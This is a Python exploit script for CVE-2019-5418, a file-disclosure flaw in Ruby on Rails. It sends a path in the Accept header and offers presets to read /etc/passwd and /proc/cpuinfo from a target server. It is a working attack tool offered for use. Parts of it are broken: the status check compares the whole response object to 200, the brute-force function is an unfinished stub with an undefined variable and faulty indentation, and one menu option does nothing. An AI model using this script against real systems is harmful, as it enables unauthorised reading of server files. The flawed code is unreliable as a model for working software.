import sys
import time
import random
try:
    import requests
except ImportError:
    print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')
    sys.exit(1)

def banner():
    banner = """
    ----------------------------------------------
    Arbitrary Traversal exploit for Ruby on Rails
    CVE-2019-5418
    ----------------------------------------------
    """
    print(banner)

def check_args():
    if len(sys.argv) != 2:
        print("Invalid number of arguments entered!")
        how_to_use = "python3 Bandit.py url"
        print('Use as:', how_to_use)
        sys.exit(1)


def check_url(url):
    status_code = requests.get(url)
    if status_code != 200:
        print("Url is invalid or can not be reached!")
        sys.exit(1)


def read_file(url, file):
    headers = {'Accept': file + '{{'}
    req = requests.get(url, headers=headers)
    return req

def brute_force_data(url):
	# function to brute force sensitive data 
	# assuming the person did not rename ruby on rails stable directories
	headers = {'Accept': file + '{{'}
	above = '../'
        
        # time.sleep(random.randint(.5,3))
        # uncomment this to be less noisy


def main():
    banner()
    check_args()
    url = sys.argv[1]
    while True:
        try:
            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for seeds.rb: \033[0m")
        except Exception:
            file = raw_input("\033[93m[!] Enter file to read (enter quit or q to exit): \033[0m")
        if file == 'quit' or file == 'q':
                break
        if file == '1':
            file = '../../../../../../../../../etc/passwd'
        elif file == '2':
            file = '../../../../../../../../../proc/cpuinfo'
        response = read_file(url, file)
        print(response.text)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[93m[!] ctrl+c detected from user, quitting.\n\n \033[0m')
